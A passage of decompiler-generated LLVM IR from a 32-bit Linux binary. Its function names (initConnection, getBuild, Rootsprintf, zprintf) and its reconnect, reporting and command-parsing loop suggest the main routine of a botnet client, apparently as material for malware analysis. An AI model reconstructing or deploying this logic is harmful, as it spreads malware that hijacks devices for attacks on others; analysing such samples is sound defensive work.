  store i8* inttoptr (i32 13 to i8*), i8** %stack_var_-5888, align 4
  %v3_804cf6f = call i32 @__bsd_signal(i32 13, i32 1)
  store i32 %v3_804cf6f, i32* %eax.global-to-local, align 4
  %v0_804cf74 = load i32, i32* @esp, align 4
  %v2_804cf74 = icmp ugt i32 %v0_804cf74, -17
  store i1 %v2_804cf74, i1* %cf.global-to-local, align 1
  %v2_804d631 = ptrtoint i32* %stack_var_-5744 to i32
  %tmp190 = bitcast i32* %stack_var_-5744 to i8*
  %tmp191 = bitcast i8** %stack_var_-36 to i32*
  %v2_804d5e8 = ptrtoint i32* %stack_var_-624 to i32
  %v2_804d424 = ptrtoint i32* %stack_var_-1648 to i32
  %v5_804d297 = and i32 %v2_804d631, -256
  %v1_804d2a4 = or i32 %v2_804d631, 1
  %storemerge16209 = inttoptr i32 %v1_804d2a4 to i8*
  br label %dec_label_pc_804cf79.outer

dec_label_pc_804cf79.outer:                       ; preds = %dec_label_pc_804d263, %dec_label_pc_804d631, %dec_label_pc_804cf53
  %stack_var_-28.0.ph = phi i32 [ %tmp, %dec_label_pc_804cf53 ], [ %stack_var_-28.1.ph, %dec_label_pc_804d631 ], [ %stack_var_-28.1.ph, %dec_label_pc_804d263 ]
  %stack_var_-5832.0.ph = phi i32 [ %tmp123, %dec_label_pc_804cf53 ], [ %stack_var_-5832.2.ph27, %dec_label_pc_804d631 ], [ %stack_var_-5832.2.ph27, %dec_label_pc_804d263 ]
  %stack_var_-64.0.ph = phi i8* [ %tmp126, %dec_label_pc_804cf53 ], [ %stack_var_-64.2.ph32, %dec_label_pc_804d631 ], [ %stack_var_-64.2.ph32, %dec_label_pc_804d263 ]
  %stack_var_-60.0.ph36 = phi i32 [ %tmp135, %dec_label_pc_804cf53 ], [ %stack_var_-60.3, %dec_label_pc_804d631 ], [ %stack_var_-60.2, %dec_label_pc_804d263 ]
  %stack_var_-96.0.ph37 = phi i32 [ 0, %dec_label_pc_804cf53 ], [ %stack_var_-96.2.ph34, %dec_label_pc_804d631 ], [ %v4_804d263, %dec_label_pc_804d263 ]
  %v0_804cf7955 = call i32 @initConnection()
  store i32 %v0_804cf7955, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cf7e56 = icmp eq i32 %v0_804cf7955, 0
  br i1 %v1_804cf7e56, label %dec_label_pc_804cf91, label %dec_label_pc_804cf82

dec_label_pc_804cf82:                             ; preds = %dec_label_pc_804cf79.outer, %dec_label_pc_804cf82
  %v0_804cf82 = load i32, i32* @esp, align 4
  %v5_804cf82 = icmp ult i32 %v0_804cf82, 12
  store i1 %v5_804cf82, i1* %cf.global-to-local, align 1
  %v1_804cf85 = add i32 %v0_804cf82, -16
  %v2_804cf85 = inttoptr i32 %v1_804cf85 to i32*
  store i32 30, i32* %v2_804cf85, align 4
  %v0_804cf87 = call i32 @sleep()
  store i32 %v0_804cf87, i32* %eax.global-to-local, align 4
  %v0_804cf8c = load i32, i32* @esp, align 4
  %v2_804cf8c = icmp ugt i32 %v0_804cf8c, -17
  store i1 %v2_804cf8c, i1* %cf.global-to-local, align 1
  %v0_804cf79 = call i32 @initConnection()
  store i32 %v0_804cf79, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cf7e = icmp eq i32 %v0_804cf79, 0
  br i1 %v1_804cf7e, label %dec_label_pc_804cf91, label %dec_label_pc_804cf82

dec_label_pc_804cf91:                             ; preds = %dec_label_pc_804cf82, %dec_label_pc_804cf79.outer
  %v0_804cf91 = call i32 @getBuild()
  store i32 %v0_804cf91, i32* %eax.global-to-local, align 4
  store i32 %v0_804cf91, i32* @ebx, align 4
  %v0_804cf98 = load i32, i32* @esp, align 4
  %v5_804cf98 = icmp ult i32 %v0_804cf98, 12
  store i1 %v5_804cf98, i1* %cf.global-to-local, align 1
  %v0_804cf9b = load i32, i32* @global_var_80603e8.41, align 8
  %v2_804cf9b = add i32 %v0_804cf98, -16
  %v3_804cf9b = inttoptr i32 %v2_804cf9b to i32*
  store i32 %v0_804cf9b, i32* %v3_804cf9b, align 4
  %v0_804cfa1 = load i8*, i8** %stack_var_-5888, align 4
  %v1_804cfa1 = ptrtoint i8* %v0_804cfa1 to i32
  %v2_804cfa1 = call i32 @__GI_inet_ntoa(i32 %v1_804cfa1)
  store i32 %v2_804cfa1, i32* %eax.global-to-local, align 4
  %v0_804cfa6 = load i32, i32* @esp, align 4
  %v2_804cfa6 = icmp ugt i32 %v0_804cfa6, -17
  store i1 %v2_804cfa6, i1* %cf.global-to-local, align 1
  %v0_804cfa9 = load i32, i32* @global_var_805a160.18, align 32
  store i32 %v0_804cfa9, i32* %edx.global-to-local, align 4
  %v0_804cfaf = load i32, i32* @ebx, align 4
  %v2_804cfaf = add i32 %v0_804cfa6, 12
  %v3_804cfaf = inttoptr i32 %v2_804cfaf to i32*
  store i32 %v0_804cfaf, i32* %v3_804cfaf, align 4
  %v2_804cfb0 = add i32 %v0_804cfa6, 8
  %v3_804cfb0 = inttoptr i32 %v2_804cfb0 to i32*
  store i32 %v2_804cfa1, i32* %v3_804cfb0, align 4
  %v1_804cfb1 = add i32 %v0_804cfa6, 4
  %v2_804cfb1 = inttoptr i32 %v1_804cfb1 to i32*
  store i32 ptrtoint (i32* @global_var_80566e8.180 to i32), i32* %v2_804cfb1, align 4
  %v0_804cfb6 = load i32, i32* %edx.global-to-local, align 4
  %v3_804cfb6 = inttoptr i32 %v0_804cfa6 to i32*
  store i32 %v0_804cfb6, i32* %v3_804cfb6, align 4
  %v0_804cfb7 = load i8*, i8** %stack_var_-5888, align 4
  %v1_804cfb7 = ptrtoint i8* %v0_804cfb7 to i32
  %v3_804cfb7 = call i32 @Rootsprintf(i32 %v1_804cfb7, i32 1)
  store i32 %v3_804cfb7, i32* %eax.global-to-local, align 4
  %v0_804cfbc = load i32, i32* @esp, align 4
  %v2_804cfbc = icmp ugt i32 %v0_804cfbc, -17
  store i1 %v2_804cfbc, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d631.outer

dec_label_pc_804cfde:                             ; preds = %dec_label_pc_804d1d3, %dec_label_pc_804d187
  %v2_804cfe1 = mul i32 %storemerge17, 4
  store i32 %v2_804cfe1, i32* %edx.global-to-local, align 4
  %v0_804cfe6 = load i32, i32* @global_var_80603f4.34, align 4
  %v2_804cfeb = add i32 %v0_804cfe6, %v2_804cfe1
  store i32 %v2_804cfeb, i32* %eax.global-to-local, align 4
  %v1_804cfee = inttoptr i32 %v2_804cfeb to i32*
  %v2_804cfee = load i32, i32* %v1_804cfee, align 4
  store i32 %v2_804cfee, i32* %eax.global-to-local, align 4
  %tmp283 = and i32 %v0_804cff0.in, -4
  %v5_804cff0 = icmp eq i32 %tmp283, -16
  store i1 %v5_804cff0, i1* %cf.global-to-local, align 1
  %v1_804cff3 = add i32 %v0_804cff0.in, 8
  %v2_804cff3 = inttoptr i32 %v1_804cff3 to i32*
  store i32 1, i32* %v2_804cff3, align 4
  %v1_804cff5 = add i32 %v0_804cff0.in, 4
  %v2_804cff5 = inttoptr i32 %v1_804cff5 to i32*
  store i32 0, i32* %v2_804cff5, align 4
  %v0_804cff7 = load i32, i32* %eax.global-to-local, align 4
  %v3_804cff7 = inttoptr i32 %v0_804cff0.in to i32*
  store i32 %v0_804cff7, i32* %v3_804cff7, align 4
  %v4_804cff8 = call i32 @__libc_waitpid(i32 %storemerge17, i32 %v2_804cff8, i32 %stack_var_-60.2)
  store i32 %v4_804cff8, i32* %eax.global-to-local, align 4
  %v0_804cffd = load i32, i32* @esp, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp192 = icmp slt i32 %v4_804cff8, 1
  %.pre = add i32 %storemerge17, 1
  br i1 %tmp192, label %dec_label_pc_804d184, label %dec_label_pc_804d008

dec_label_pc_804d008:                             ; preds = %dec_label_pc_804cfde
  store i32 %.pre, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d03b

dec_label_pc_804d011:                             ; preds = %dec_label_pc_804d03b, %dec_label_pc_804d075
  %v2_804d014 = mul i32 %storemerge19, 4
  %v0_804d019 = load i32, i32* @global_var_80603f4.34, align 4
  %v2_804d01e = add i32 %v0_804d019, %v2_804d014
  %v1_804d021 = add i32 %v2_804d01e, -4
  store i32 %v2_804d014, i32* %edx.global-to-local, align 4
  store i32 %v2_804d01e, i32* %eax.global-to-local, align 4
  %v1_804d034 = inttoptr i32 %v2_804d01e to i32*
  %v2_804d034 = load i32, i32* %v1_804d034, align 4
  store i32 %v2_804d034, i32* %eax.global-to-local, align 4
  %v2_804d036 = inttoptr i32 %v1_804d021 to i32*
  store i32 %v2_804d034, i32* %v2_804d036, align 4
  %v4_804d038 = add i32 %storemerge19, 1
  br label %dec_label_pc_804d03b

dec_label_pc_804d03b:                             ; preds = %dec_label_pc_804d008, %dec_label_pc_804d011
  %storemerge19 = phi i32 [ %v4_804d038, %dec_label_pc_804d011 ], [ %.pre, %dec_label_pc_804d008 ]
  store i32 %storemerge19, i32* %eax.global-to-local, align 4
  %v0_804d04f = load i32, i32* @global_var_805a168.32, align 8
  store i32 %v0_804d04f, i32* %edx.global-to-local, align 4
  %v0_804d055 = load i32, i32* @global_var_805a16c.33, align 4
  %v10_804d06d = icmp eq i32 %v0_804d055, 0
  br i1 %v10_804d06d, label %dec_label_pc_804d075, label %dec_label_pc_804d011

dec_label_pc_804d075:                             ; preds = %dec_label_pc_804d03b
  store i32 0, i32* @esi, align 4
  store i32 %v0_804d04f, i32* @edi, align 4
  %v10_804d089 = icmp ult i32 %storemerge19, %v0_804d04f
  br i1 %v10_804d089, label %dec_label_pc_804d011, label %dec_label_pc_804d091

dec_label_pc_804d091:                             ; preds = %dec_label_pc_804d075
  %v2_804d094 = mul i32 %storemerge19, 4
  %v0_804d099 = load i32, i32* @global_var_80603f4.34, align 4
  %v2_804d09e = add i32 %v2_804d094, -4
  %v1_804d0a1 = add i32 %v2_804d09e, %v0_804d099
  %v1_804d0a4 = inttoptr i32 %v1_804d0a1 to i32*
  store i32 0, i32* %v1_804d0a4, align 4
  %v0_804d0aa = load i32, i32* @global_var_805a168.32, align 8
  %v0_804d0af = load i32, i32* @global_var_805a16c.33, align 4
  %v1_804d0b5 = add i32 %v0_804d0aa, -1
  %v4_804d0b5 = icmp ne i32 %v0_804d0aa, 0
  %v2_804d0b8 = zext i1 %v4_804d0b5 to i32
  %v3_804d0b8 = add i32 %v0_804d0af, -1
  %v4_804d0b8 = add i32 %v3_804d0b8, %v2_804d0b8
  store i32 %v1_804d0b5, i32* @global_var_805a168.32, align 8
  store i32 %v4_804d0b8, i32* @global_var_805a16c.33, align 4
  %v3_804d0d1 = mul i32 %v4_804d0b8, 4
  %v4_804d0d1 = udiv i32 %v1_804d0b5, 1073741824
  %v5_804d0d1 = or i32 %v3_804d0d1, %v4_804d0d1
  store i32 %v5_804d0d1, i32* %edx.global-to-local, align 4
  %v2_804d0d5 = mul i32 %v1_804d0b5, 4
  %v1_804d0d8 = add i32 %v2_804d0d5, 4
  store i32 %v1_804d0d8, i32* %eax.global-to-local, align 4
  %v0_804d0db = load i32, i32* @esp, align 4
  %v5_804d0db = icmp ult i32 %v0_804d0db, 12
  store i1 %v5_804d0db, i1* %cf.global-to-local, align 1
  %v2_804d0de = add i32 %v0_804d0db, -16
  %v3_804d0de = inttoptr i32 %v2_804d0de to i32*
  store i32 %v1_804d0d8, i32* %v3_804d0de, align 4
  %v1_804d0df = call i32 @malloc(i32 0)
  store i32 %v1_804d0df, i32* %eax.global-to-local, align 4
  %v0_804d0e4 = load i32, i32* @esp, align 4
  %v2_804d0e4 = icmp ugt i32 %v0_804d0e4, -17
  store i1 %v2_804d0e4, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d115

dec_label_pc_804d0f3:                             ; preds = %dec_label_pc_804d115, %dec_label_pc_804d14f
  %v2_804d0f6 = mul i32 %storemerge18, 4
  %v5_804d0fb = add i32 %v2_804d0f6, %v1_804d0df
  store i32 %v2_804d0f6, i32* %edx.global-to-local, align 4
  %v0_804d106 = load i32, i32* @global_var_80603f4.34, align 4
  %v2_804d10b = add i32 %v0_804d106, %v2_804d0f6
  store i32 %v2_804d10b, i32* %eax.global-to-local, align 4
  %v1_804d10e = inttoptr i32 %v2_804d10b to i32*
  %v2_804d10e = load i32, i32* %v1_804d10e, align 4
  store i32 %v2_804d10e, i32* %eax.global-to-local, align 4
  %v2_804d110 = inttoptr i32 %v5_804d0fb to i32*
  store i32 %v2_804d10e, i32* %v2_804d110, align 4
  %v4_804d112 = add i32 %storemerge18, 1
  br label %dec_label_pc_804d115

dec_label_pc_804d115:                             ; preds = %dec_label_pc_804d091, %dec_label_pc_804d0f3
  %storemerge18 = phi i32 [ %v4_804d112, %dec_label_pc_804d0f3 ], [ 0, %dec_label_pc_804d091 ]
  store i32 %storemerge18, i32* %eax.global-to-local, align 4
  %v0_804d129 = load i32, i32* @global_var_805a168.32, align 8
  store i32 %v0_804d129, i32* %edx.global-to-local, align 4
  %v0_804d12f = load i32, i32* @global_var_805a16c.33, align 4
  %v10_804d147 = icmp eq i32 %v0_804d12f, 0
  br i1 %v10_804d147, label %dec_label_pc_804d14f, label %dec_label_pc_804d0f3

dec_label_pc_804d14f:                             ; preds = %dec_label_pc_804d115
  store i32 0, i32* @esi, align 4
  store i32 %v0_804d129, i32* @edi, align 4
  %v10_804d163 = icmp ult i32 %storemerge18, %v0_804d129
  br i1 %v10_804d163, label %dec_label_pc_804d0f3, label %dec_label_pc_804d16b

dec_label_pc_804d16b:                             ; preds = %dec_label_pc_804d14f
  %v0_804d16b = load i32, i32* @global_var_80603f4.34, align 4
  store i32 %v0_804d16b, i32* %eax.global-to-local, align 4
  %v0_804d170 = load i32, i32* @esp, align 4
  %v5_804d170 = icmp ult i32 %v0_804d170, 12
  store i1 %v5_804d170, i1* %cf.global-to-local, align 1
  %v2_804d173 = add i32 %v0_804d170, -16
  %v3_804d173 = inttoptr i32 %v2_804d173 to i32*
  store i32 %v0_804d16b, i32* %v3_804d173, align 4
  %v1_804d174 = call i32 @free(i32 0)
  %v0_804d179 = load i32, i32* @esp, align 4
  %v2_804d179 = icmp ugt i32 %v0_804d179, -17
  store i1 %v2_804d179, i1* %cf.global-to-local, align 1
  store i32 %v1_804d0df, i32* %eax.global-to-local, align 4
  store i32 %v1_804d0df, i32* @global_var_80603f4.34, align 4
  br label %dec_label_pc_804d184

dec_label_pc_804d184:                             ; preds = %dec_label_pc_804cfde, %dec_label_pc_804d16b
  %v0_804cff0104.in = phi i32 [ %v0_804d179, %dec_label_pc_804d16b ], [ %v0_804cffd, %dec_label_pc_804cfde ]
  %stack_var_-60.1 = phi i32 [ %v1_804d0df, %dec_label_pc_804d16b ], [ %stack_var_-60.2, %dec_label_pc_804cfde ]
  br label %dec_label_pc_804d187

dec_label_pc_804d187:                             ; preds = %dec_label_pc_804d631, %dec_label_pc_804d184
  %v0_804cff0.in = phi i32 [ %v0_804cff0104.in, %dec_label_pc_804d184 ], [ %v0_804d64c, %dec_label_pc_804d631 ]
  %stack_var_-60.2 = phi i32 [ %stack_var_-60.1, %dec_label_pc_804d184 ], [ %stack_var_-60.3, %dec_label_pc_804d631 ]
  %storemerge17 = phi i32 [ %.pre, %dec_label_pc_804d184 ], [ 0, %dec_label_pc_804d631 ]
  store i32 %storemerge17, i32* %eax.global-to-local, align 4
  %v2_804d192 = ashr i32 %storemerge17, 31
  store i32 %v2_804d192, i32* %edx.global-to-local, align 4
  %v0_804d19b = load i32, i32* @global_var_805a168.32, align 8
  store i32 %v0_804d19b, i32* @esi, align 4
  %v0_804d1a1 = load i32, i32* @global_var_805a16c.33, align 4
  store i32 %v0_804d1a1, i32* @edi, align 4
  %v10_804d1b9 = icmp ult i32 %v2_804d192, %v0_804d1a1
  store i1 %v10_804d1b9, i1* %cf.global-to-local, align 1
  br i1 %v10_804d1b9, label %dec_label_pc_804cfde, label %dec_label_pc_804d1c5

dec_label_pc_804d1c5:                             ; preds = %dec_label_pc_804d187
  store i32 %v0_804d1a1, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v6_804d1d1 = icmp ugt i32 %v2_804d192, %v0_804d1a1
  br i1 %v6_804d1d1, label %dec_label_pc_804d1e5, label %dec_label_pc_804d1d3

dec_label_pc_804d1d3:                             ; preds = %dec_label_pc_804d1c5
  store i32 %v0_804d19b, i32* %edx.global-to-local, align 4
  %v10_804d1d9 = icmp ult i32 %storemerge17, %v0_804d19b
  store i1 %v10_804d1d9, i1* %cf.global-to-local, align 1
  br i1 %v10_804d1d9, label %dec_label_pc_804cfde, label %dec_label_pc_804d1e5

dec_label_pc_804d1e5:                             ; preds = %dec_label_pc_804d1d3, %dec_label_pc_804d1c5
  %v0_804d1e8 = load i32, i32* @ebp, align 4
  %v2_804d1e8 = add i32 %v0_804d647, -5736
  %v3_804d1e8 = add i32 %v2_804d1e8, %v0_804d1e8
  %v4_804d1e8 = inttoptr i32 %v3_804d1e8 to i8*
  store i8 0, i8* %v4_804d1e8, align 1
  %v0_804d1f0 = load i32, i32* @esp, align 4
  %v5_804d1f0 = icmp ult i32 %v0_804d1f0, 12
  store i1 %v5_804d1f0, i1* %cf.global-to-local, align 1
  store i32 %v2_804d631, i32* %eax.global-to-local, align 4
  %v2_804d1f9 = add i32 %v0_804d1f0, -16
  %v3_804d1f9 = inttoptr i32 %v2_804d1f9 to i32*
  store i32 %v2_804d631, i32* %v3_804d1f9, align 4
  %v0_804d1fa = call i32 @trim()
  %v0_804d1ff = load i32, i32* @esp, align 4
  %tmp277 = and i32 %v0_804d1ff, -8
  %v5_804d202 = icmp eq i32 %tmp277, -16
  store i1 %v5_804d202, i1* %cf.global-to-local, align 1
  %v1_804d205 = add i32 %v0_804d1ff, 4
  %v2_804d205 = inttoptr i32 %v1_804d205 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8056160.19 to i32), i32* %v2_804d205, align 4
  store i32 %v2_804d631, i32* %eax.global-to-local, align 4
  %v3_804d210 = inttoptr i32 %v0_804d1ff to i32*
  store i32 %v2_804d631, i32* %v3_804d210, align 4
  %v3_804d211 = call i32 @strstr(i32 %v0_804d1a1, i8* bitcast (i32* @0 to i8*))
  %v0_804d216 = load i32, i32* @esp, align 4
  %v1_804d216 = add i32 %v0_804d216, 16
  store i32 %v3_804d211, i32* %edx.global-to-local, align 4
  store i32 %v2_804d631, i32* %eax.global-to-local, align 4
  %v7_804d221 = icmp ult i32 %v3_804d211, %v2_804d631
  store i1 %v7_804d221, i1* %cf.global-to-local, align 1
  %v12_804d221 = icmp eq i32 %v3_804d211, %v2_804d631
  %v1_804d223 = icmp eq i1 %v12_804d221, false
  br i1 %v1_804d223, label %dec_label_pc_804d240, label %dec_label_pc_804d225

dec_label_pc_804d225:                             ; preds = %dec_label_pc_804d1e5
  %v0_804d225 = load i32, i32* @global_var_805a160.18, align 32
  store i32 %v0_804d225, i32* %eax.global-to-local, align 4
  %v5_804d22a = icmp ult i32 %v1_804d216, 8
  store i1 %v5_804d22a, i1* %cf.global-to-local, align 1
  %v1_804d22d = add i32 %v0_804d216, 4
  %v2_804d22d = inttoptr i32 %v1_804d22d to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_805674f.181 to i32), i32* %v2_804d22d, align 4
  %v0_804d232 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d232 = inttoptr i32 %v0_804d216 to i32*
  store i32 %v0_804d232, i32* %v3_804d232, align 4
  %v2_804d233 = call i32 @Rootsprintf(i32 %v0_804d1a1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804d233, i32* %eax.global-to-local, align 4
  %v0_804d238 = load i32, i32* @esp, align 4
  %v1_804d238 = add i32 %v0_804d238, 16
  %v2_804d238 = icmp ugt i32 %v0_804d238, -17
  store i1 %v2_804d238, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d631

dec_label_pc_804d240:                             ; preds = %dec_label_pc_804d1e5
  %v5_804d240 = icmp ult i32 %v1_804d216, 8
  store i1 %v5_804d240, i1* %cf.global-to-local, align 1
  %v1_804d243 = add i32 %v0_804d216, 4
  %v2_804d243 = inttoptr i32 %v1_804d243 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_8056754.182 to i32), i32* %v2_804d243, align 4
  store i32 %v2_804d631, i32* %eax.global-to-local, align 4
  %v3_804d24e = inttoptr i32 %v0_804d216 to i32*
  store i32 %v2_804d631, i32* %v3_804d24e, align 4
  %v3_804d24f = call i32 @strstr(i32 %v0_804d1a1, i8* bitcast (i32* @0 to i8*))
  %v0_804d254 = load i32, i32* @esp, align 4
  store i32 %v3_804d24f, i32* @edx, align 4
  store i32 %v2_804d631, i32* %eax.global-to-local, align 4
  %v7_804d25f = icmp ult i32 %v3_804d24f, %v2_804d631
  store i1 %v7_804d25f, i1* %cf.global-to-local, align 1
  %v12_804d25f = icmp eq i32 %v3_804d24f, %v2_804d631
  %v1_804d261 = icmp eq i1 %v12_804d25f, false
  br i1 %v1_804d261, label %dec_label_pc_804d28b, label %dec_label_pc_804d263

dec_label_pc_804d263:                             ; preds = %dec_label_pc_804d240
  %v1_804d254 = add i32 %v0_804d254, 16
  %v4_804d263 = add i32 %stack_var_-96.2.ph34, 1
  store i32 ptrtoint ([20 x i8]* @global_var_805675d.183 to i32), i32* %eax.global-to-local, align 4
  %v5_804d26b = icmp ult i32 %v1_804d254, 12
  store i1 %v5_804d26b, i1* %cf.global-to-local, align 1
  %v3_804d26e = inttoptr i32 %v0_804d254 to i32*
  store i32 ptrtoint ([20 x i8]* @global_var_805675d.183 to i32), i32* %v3_804d26e, align 4
  %v1_804d26f = call i32 @zprintf(i32 %v4_804d263)
  store i32 %v1_804d26f, i32* @eax, align 4
  %v0_804d274 = load i32, i32* @esp, align 4
  %v9_804d277 = icmp ult i32 %v4_804d263, 20
  store i1 %v9_804d277, i1* %cf.global-to-local, align 1
  %v7_804d27b = icmp sgt i32 %v4_804d263, 20
  br i1 %v7_804d27b, label %dec_label_pc_804d281, label %dec_label_pc_804cf79.outer

dec_label_pc_804d281:                             ; preds = %dec_label_pc_804d263
  %v1_804d274 = add i32 %v0_804d274, 16
  %v5_804d281 = icmp ult i32 %v1_804d274, 12
  store i1 %v5_804d281, i1* %cf.global-to-local, align 1
  %v2_804d284 = inttoptr i32 %v0_804d274 to i32*
  store i32 0, i32* %v2_804d284, align 4
  %v1_804d286 = call i32 @__GI_exit(i32 %v4_804d263)
  store i32 %v1_804d286, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d28b

dec_label_pc_804d28b:                             ; preds = %dec_label_pc_804d240, %dec_label_pc_804d281
  %stack_var_-96.1 = phi i32 [ %stack_var_-96.2.ph34, %dec_label_pc_804d240 ], [ %v4_804d263, %dec_label_pc_804d281 ]
  %v2_804d297 = load i8, i8* %tmp190, align 4
  %v3_804d297 = zext i8 %v2_804d297 to i32
  %v6_804d297 = or i32 %v3_804d297, %v5_804d297
  store i32 %v6_804d297, i32* %eax.global-to-local, align 4
  %v6_804d299 = icmp ult i8 %v2_804d297, 33
  store i1 %v6_804d299, i1* %cf.global-to-local, align 1
  %v10_804d299 = icmp eq i8 %v2_804d297, 33
  %v1_804d29b = icmp eq i1 %v10_804d299, false
  br i1 %v1_804d29b, label %dec_label_pc_804d631.outer31, label %dec_label_pc_804d2a1

dec_label_pc_804d2a1:                             ; preds = %dec_label_pc_804d28b
  store i32 %v1_804d2a4, i32* %eax.global-to-local, align 4
  %v2_804d2b0210 = load i8, i8* %storemerge16209, align 1
  %v3_804d2b0211 = zext i8 %v2_804d2b0210 to i32
  %v6_804d2b0213 = or i32 %v3_804d2b0211, %v5_804d297
  store i32 %v6_804d2b0213, i32* %eax.global-to-local, align 4
  %v3_804d2b2214 = icmp ult i8 %v2_804d2b0210, 32
  store i1 %v3_804d2b2214, i1* %cf.global-to-local, align 1
  %v7_804d2b2215 = icmp eq i8 %v2_804d2b0210, 32
  br i1 %v7_804d2b2215, label %dec_label_pc_804d2bf, label %dec_label_pc_804d2b6

dec_label_pc_804d2aa:                             ; preds = %dec_label_pc_804d2b6
  %v5_804d2aa = add i32 %storemerge16.in216, 1
  %storemerge16 = inttoptr i32 %v5_804d2aa to i8*
  store i32 %v5_804d2aa, i32* %eax.global-to-local, align 4
  %v2_804d2b0 = load i8, i8* %storemerge16, align 1
  %v3_804d2b0 = zext i8 %v2_804d2b0 to i32
  %v5_804d2b0 = and i32 %v5_804d2aa, -256
  %v6_804d2b0 = or i32 %v3_804d2b0, %v5_804d2b0
  store i32 %v6_804d2b0, i32* %eax.global-to-local, align 4
  %v3_804d2b2 = icmp ult i8 %v2_804d2b0, 32
  store i1 %v3_804d2b2, i1* %cf.global-to-local, align 1
  %v7_804d2b2 = icmp eq i8 %v2_804d2b0, 32
  br i1 %v7_804d2b2, label %dec_label_pc_804d2bf, label %dec_label_pc_804d2b6

dec_label_pc_804d2b6:                             ; preds = %dec_label_pc_804d2a1, %dec_label_pc_804d2aa
  %v5_804d2b0218 = phi i32 [ %v5_804d2b0, %dec_label_pc_804d2aa ], [ %v5_804d297, %dec_label_pc_804d2a1 ]
  %storemerge16217 = phi i8* [ %storemerge16, %dec_label_pc_804d2aa ], [ %storemerge16209, %dec_label_pc_804d2a1 ]
  %storemerge16.in216 = phi i32 [ %v5_804d2aa, %dec_label_pc_804d2aa ], [ %v1_804d2a4, %dec_label_pc_804d2a1 ]
  store i32 %storemerge16.in216, i32* %eax.global-to-local, align 4
  %v2_804d2b9 = load i8, i8* %storemerge16217, align 1
  %v3_804d2b9 = zext i8 %v2_804d2b9 to i32
  %v6_804d2b9 = or i32 %v3_804d2b9, %v5_804d2b0218
  store i32 %v6_804d2b9, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d2bb = icmp eq i8 %v2_804d2b9, 0
  %v1_804d2bd = icmp eq i1 %v4_804d2bb, false
  br i1 %v1_804d2bd, label %dec_label_pc_804d2aa, label %dec_label_pc_804d2bf

dec_label_pc_804d2bf:                             ; preds = %dec_label_pc_804d2aa, %dec_label_pc_804d2b6, %dec_label_pc_804d2a1
  %storemerge16.in.lcssa = phi i32 [ %v1_804d2a4, %dec_label_pc_804d2a1 ], [ %storemerge16.in216, %dec_label_pc_804d2b6 ], [ %v5_804d2aa, %dec_label_pc_804d2aa ]
  %storemerge16.lcssa = phi i8* [ %storemerge16209, %dec_label_pc_804d2a1 ], [ %storemerge16217, %dec_label_pc_804d2b6 ], [ %storemerge16, %dec_label_pc_804d2aa ]
  %v5_804d2b0.lcssa = phi i32 [ %v5_804d297, %dec_label_pc_804d2a1 ], [ %v5_804d2b0218, %dec_label_pc_804d2b6 ], [ %v5_804d2b0, %dec_label_pc_804d2aa ]
  store i32 %storemerge16.in.lcssa, i32* %eax.global-to-local, align 4
  %v2_804d2c2 = load i8, i8* %storemerge16.lcssa, align 1
  %v3_804d2c2 = zext i8 %v2_804d2c2 to i32
  %v6_804d2c2 = or i32 %v3_804d2c2, %v5_804d2b0.lcssa
  store i32 %v6_804d2c2, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d2c4 = icmp eq i8 %v2_804d2c2, 0
  br i1 %v4_804d2c4, label %dec_label_pc_804d631.outer31, label %dec_label_pc_804d2cc

dec_label_pc_804d2cc:                             ; preds = %dec_label_pc_804d2bf
  store i8 0, i8* %storemerge16.lcssa, align 1
  store i32 %v5_804d297, i32* %eax.global-to-local, align 4
  %v3_804d2f0 = call i32 @_strlen(i8* %storemerge16209)
  %v6_804d2f7 = add i32 %v2_804d631, %v3_804d2f0
  %v1_804d2fa = add i32 %v6_804d2f7, 2
  %v5_804d2fa = icmp ugt i32 %v6_804d2f7, -3
  store i1 %v5_804d2fa, i1* %cf.global-to-local, align 1
  store i32 %v1_804d2fa, i32* %eax.global-to-local, align 4
  %v5_804d2fd = inttoptr i32 %v1_804d2fa to i8*
  %v1_804d335 = and i32 %v1_804d2fa, -256
  br label %dec_label_pc_804d327

dec_label_pc_804d302:                             ; preds = %dec_label_pc_804d34f, %dec_label_pc_804d327
  store i32 %v1_804d335, i32* %eax.global-to-local, align 4
  %v3_804d319 = call i32 @_strlen(i8* %v5_804d2fd)
  %v4_804d319 = mul i32 %v3_804d319, -1
  %v1_804d31f = sub i32 0, %v4_804d319
  %v6_804d320 = sub i32 %v1_804d2fa, %v4_804d319
  %v11_804d320 = icmp ult i32 %v6_804d320, %v1_804d31f
  store i1 %v11_804d320, i1* %cf.global-to-local, align 1
  %v1_804d323 = add i32 %v6_804d320, -1
  store i32 %v1_804d323, i32* %eax.global-to-local, align 4
  %v1_804d324 = inttoptr i32 %v1_804d323 to i8*
  store i8 0, i8* %v1_804d324, align 1
  br label %dec_label_pc_804d327

dec_label_pc_804d327:                             ; preds = %dec_label_pc_804d2cc, %dec_label_pc_804d302
  %stack_var_-5832.1 = phi i32 [ %stack_var_-5832.2.ph27, %dec_label_pc_804d2cc ], [ %v1_804d2fa, %dec_label_pc_804d302 ]
  store i32 %v1_804d335, i32* %eax.global-to-local, align 4
  %v3_804d33e = call i32 @_strlen(i8* %v5_804d2fd)
  %v4_804d33e = mul i32 %v3_804d33e, -1
  %v1_804d344 = sub i32 0, %v4_804d33e
  %v6_804d345 = sub i32 %v1_804d2fa, %v4_804d33e
  %v11_804d345 = icmp ult i32 %v6_804d345, %v1_804d344
  store i1 %v11_804d345, i1* %cf.global-to-local, align 1
  %v1_804d348 = add i32 %v6_804d345, -1
  store i32 %v1_804d348, i32* %eax.global-to-local, align 4
  %v1_804d349 = inttoptr i32 %v1_804d348 to i8*
